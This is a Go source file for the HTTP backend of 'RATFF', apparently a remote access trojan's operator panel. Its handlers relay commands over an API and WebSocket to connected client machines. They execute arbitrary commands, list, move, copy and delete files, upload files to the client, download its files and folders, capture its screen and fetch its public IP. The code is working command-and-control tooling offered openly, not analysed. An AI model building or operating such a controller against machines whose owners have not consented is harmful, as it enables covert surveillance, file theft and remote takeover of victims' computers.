package main

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"RATFF/shared"

	"github.com/gin-gonic/gin"
)

var globalPerClientLimiter = shared.NewPerClientRateLimiter()

// buildAPIURL constructs the full API URL with optional path prefix.
func buildAPIURL(pathPrefix, endpoint string) string {
	if pathPrefix != "" {
		return cfg.APIBaseURL + "/" + pathPrefix + endpoint
	}
	return cfg.APIBaseURL + endpoint
}

// buildWSURL constructs the full WebSocket URL with optional path prefix.
func buildWSURL(pathPrefix string) string {
	baseURL := cfg.WsURL
	if baseURL == "" {
		baseURL = "ws://127.0.0.1:6341"
	}

	if pathPrefix != "" {
		return baseURL + "/" + pathPrefix + "/ws"
	}
	return baseURL + "/ws"
}

// handleExecCommand sends a command to a client via server_api and waits for the response.
func handleExecCommand(c *gin.Context) {
	var req struct {
		ClientID string                 `json:"client_id" binding:"required"`
		Command  string                 `json:"command" binding:"required"`
		Payload  map[string]interface{} `json:"payload"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[req.ClientID] = append(pendingCmd[req.ClientID], &pendingCommand{ch: ch})
	pendingMu.Unlock()

	msg := shared.NewMessage(shared.MsgCommand, shared.CommandType(req.Command), req.ClientID, req.Payload)
	data, err := json.Marshal(msg)
	if err != nil {
		cleanupPending(req.ClientID)
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}

	token, pathPrefix := getAuthInfo(c)

	urlPathPrefix := c.Param("pathPassword")
	if urlPathPrefix != "" {
		pathPrefix = urlPathPrefix
		c.SetCookie("path_prefix", pathPrefix, 3600, "/", "", cfg.CookieSecure, true)
	}

	conn, err := ensureResponseConn(pathPrefix)
	if err != nil {
		cleanupPending(req.ClientID)
		c.JSON(500, gin.H{"error": "websocket not connected: " + err.Error()})
		return
	}
	if conn != nil {
		log.Info("Connected to WebSocket server")
	}

	commandURL := buildAPIURL(pathPrefix, "/api/command")

	httpReq, err := http.NewRequest("POST", commandURL, bytes.NewBuffer(data))
	if err != nil {
		cleanupPending(req.ClientID)
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	httpReq.Header.Set("Content-Type", "application/json")
	if token != "" {
		httpReq.Header.Set("Authorization", "Bearer "+token)
	}

	resp, err := httpClient.Do(httpReq)
	if err != nil {
		cleanupPending(req.ClientID)
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}

	select {
	case msg := <-ch:
		if err := resp.Body.Close(); err != nil {
			log.WithError(err).Warn("Failed to close response body")
		}
		cleanupPending(req.ClientID)
		c.JSON(200, gin.H{"status": "completed", "response": msg})
	case <-time.After(10 * time.Second):
		if err := resp.Body.Close(); err != nil {
			log.WithError(err).Warn("Failed to close response body")
		}
		cleanupPending(req.ClientID)
		c.JSON(504, gin.H{"error": "command timed out"})
	}
}

// getAuthInfo extracts auth_token and path_prefix from the request cookies.
func getAuthInfo(c *gin.Context) (token, pathPrefix string) {
	token, _ = c.Cookie("auth_token")
	pathPrefix, _ = c.Cookie("path_prefix")
	return
}

// sendFileCommand sends a file operation command to a client and waits for response.
func sendFileCommand(c *gin.Context, cmdType string, clientID string, cmdPayload map[string]interface{}) {
	token, pathPrefix := getAuthInfo(c)

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[clientID] = append(pendingCmd[clientID], &pendingCommand{ch: ch})
	pendingMu.Unlock()

	msg := shared.NewMessage(shared.MsgCommand, shared.CommandType(cmdType), clientID, cmdPayload)
	data, err := json.Marshal(msg)
	if err != nil {
		cleanupPending(clientID)
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}

	_, err = ensureResponseConn(pathPrefix)
	if err != nil {
		cleanupPending(clientID)
		c.JSON(500, gin.H{"error": "websocket not connected: " + err.Error()})
		return
	}

	commandURL := buildAPIURL(pathPrefix, "/api/command")

	httpReq, err := http.NewRequest("POST", commandURL, bytes.NewBuffer(data))
	if err != nil {
		cleanupPending(clientID)
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	httpReq.Header.Set("Content-Type", "application/json")
	if token != "" {
		httpReq.Header.Set("Authorization", "Bearer "+token)
	}

	resp, err := httpClient.Do(httpReq)
	if err != nil {
		cleanupPending(clientID)
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}

	select {
	case msg := <-ch:
		if err := resp.Body.Close(); err != nil {
			log.WithError(err).Warn("Failed to close response body")
		}
		cleanupPending(clientID)
		if msg.Payload != nil {
			if errMsg, ok := msg.Payload["error"].(string); ok {
				c.JSON(400, gin.H{"error": errMsg})
				return
			}
		}
		c.JSON(200, gin.H{"status": "success", "response": msg.Payload})
	case <-time.After(10 * time.Second):
		if err := resp.Body.Close(); err != nil {
			log.WithError(err).Warn("Failed to close response body")
		}
		cleanupPending(clientID)
		c.JSON(504, gin.H{"error": "command timed out"})
	}
}

// handleFileList handles POST /api/file/list
func handleFileList(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id" binding:"required"`
		Path     string `json:"path"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	sendFileCommand(c, "file_list", req.ClientID, map[string]interface{}{"path": req.Path})
}

// handleFileMove handles POST /api/file/move
func handleFileMove(c *gin.Context) {
	var req struct {
		ClientID   string `json:"client_id" binding:"required"`
		OriginPath string `json:"origin_path" binding:"required"`
		NewPath    string `json:"new_path" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	sendFileCommand(c, "file_move", req.ClientID, map[string]interface{}{
		"origin_path": req.OriginPath,
		"new_path":    req.NewPath,
	})
}

// handleFileDelete handles POST /api/file/delete
func handleFileDelete(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id" binding:"required"`
		Path     string `json:"path" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	sendFileCommand(c, "file_delete", req.ClientID, map[string]interface{}{"path": req.Path})
}

// handleFileCopy handles POST /api/file/copy
func handleFileCopy(c *gin.Context) {
	var req struct {
		ClientID   string `json:"client_id" binding:"required"`
		OriginPath string `json:"origin_path" binding:"required"`
		NewPath    string `json:"new_path" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	sendFileCommand(c, "file_copy", req.ClientID, map[string]interface{}{
		"origin_path": req.OriginPath,
		"new_path":    req.NewPath,
	})
}

// handleFileUpload handles POST /api/file/upload
func handleFileUpload(c *gin.Context) {
	clientID := c.PostForm("client_id")
	remotePath := c.PostForm("remote_path")
	if clientID == "" {
		c.JSON(400, gin.H{"error": "missing client_id"})
		return
	}

	file, header, err := c.Request.FormFile("file")
	if err != nil {
		c.JSON(400, gin.H{"error": "missing file"})
		return
	}
	defer file.Close()

	tmpDir, err := os.MkdirTemp("", "ratff_upload_*")
	if err != nil {
		c.JSON(500, gin.H{"error": "create temp dir: " + err.Error()})
		return
	}

	tmpFile := filepath.Join(tmpDir, header.Filename)
	out, err := os.Create(tmpFile)
	if err != nil {
		os.RemoveAll(tmpDir)
		c.JSON(500, gin.H{"error": "create temp file: " + err.Error()})
		return
	}

	_, err = io.Copy(out, file)
	if closeErr := out.Close(); closeErr != nil && err == nil {
		os.RemoveAll(tmpDir)
		c.JSON(500, gin.H{"error": "close temp file: " + closeErr.Error()})
		return
	}
	if err != nil {
		os.RemoveAll(tmpDir)
		c.JSON(500, gin.H{"error": "save temp file: " + err.Error()})
		return
	}

	fileInfo, err := os.Stat(tmpFile)
	if err != nil {
		os.RemoveAll(tmpDir)
		c.JSON(500, gin.H{"error": "stat temp file: " + err.Error()})
		return
	}
	fileSize := fileInfo.Size()

	taskID := shared.GenerateID()
	task := taskManager.Create(taskID, "upload", 1, fileSize)
	task.FileName = header.Filename

	token, pathPrefix := getAuthInfo(c)

	c.JSON(200, gin.H{"task_id": taskID})

	go func() {
		defer os.RemoveAll(tmpDir)

		var err error
		if remotePath == "" || remotePath == "." {
			remotePath = header.Filename
		}

		isDir, dirErr := isRemoteDirectory(token, pathPrefix, clientID, remotePath)
		if dirErr == nil && isDir {
			var totalSize int64
			_ = filepath.Walk(tmpDir, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return err
				}
				if !info.IsDir() {
					totalSize += info.Size()
				}
				return nil
			})
			task.TotalBytes = totalSize
			err = uploadDirectory(token, pathPrefix, clientID, tmpDir, remotePath, task)
		} else {
			err = uploadSingleFile(token, pathPrefix, clientID, tmpFile, remotePath, task)
		}

		if err != nil {
			task.SetError(err)
		} else {
			task.SetDone("")
		}
	}()
}

// handleFileDownload handles POST /api/file/download
func handleFileDownload(c *gin.Context) {
	var req struct {
		ClientID   string `json:"client_id" binding:"required"`
		RemotePath string `json:"remote_path" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	taskID := shared.GenerateID()
	task := taskManager.Create(taskID, "download", 1, 0)
	task.FileName = filepath.Base(req.RemotePath)

	token, pathPrefix := getAuthInfo(c)

	c.JSON(200, gin.H{"task_id": taskID})

	go func() {
		isDir, err := isRemoteDirectory(token, pathPrefix, req.ClientID, req.RemotePath)
		if err != nil {
			if strings.Contains(err.Error(), "not a directory") || strings.Contains(err.Error(), "不是目录") {
				isDir = false
			} else {
				task.SetError(err)
				return
			}
		}

		if isDir {
			dirName := filepath.Base(req.RemotePath)
			task.FileName = dirName + ".zip"
			resultPath, err := downloadDirectory(token, pathPrefix, req.ClientID, req.RemotePath, task)
			if err != nil {
				task.SetError(err)
				return
			}
			task.SetDone(resultPath)
		} else {
			tmpDir, err := os.MkdirTemp("", "ratff_download_*")
			if err != nil {
				task.SetError(err)
				return
			}

			localPath := filepath.Join(tmpDir, filepath.Base(req.RemotePath))
			err = downloadSingleFile(token, pathPrefix, req.ClientID, req.RemotePath, localPath, task)
			if err != nil {
				os.RemoveAll(tmpDir)
				task.SetError(err)
				return
			}
			task.SetDone(localPath)
		}
	}()
}

// handleScreenCapture handles POST /api/screen/capture
func handleScreenCapture(c *gin.Context) {
	var req struct {
		ClientID   string  `json:"client_id" binding:"required"`
		Format     string  `json:"format"`
		Quality    float64 `json:"quality"`
		DisplayIdx float64 `json:"display_index"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	if req.Format == "" {
		req.Format = "png"
	}
	if req.Quality == 0 {
		req.Quality = 90
	}

	payload := map[string]interface{}{
		"format":        req.Format,
		"quality":       req.Quality,
		"display_index": req.DisplayIdx,
	}

	sendFileCommand(c, "screen_capture", req.ClientID, payload)
}

// handleGetPublicIP handles POST /api/public-ip
func handleGetPublicIP(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	sendFileCommand(c, "public_ip", req.ClientID, map[string]interface{}{})
}
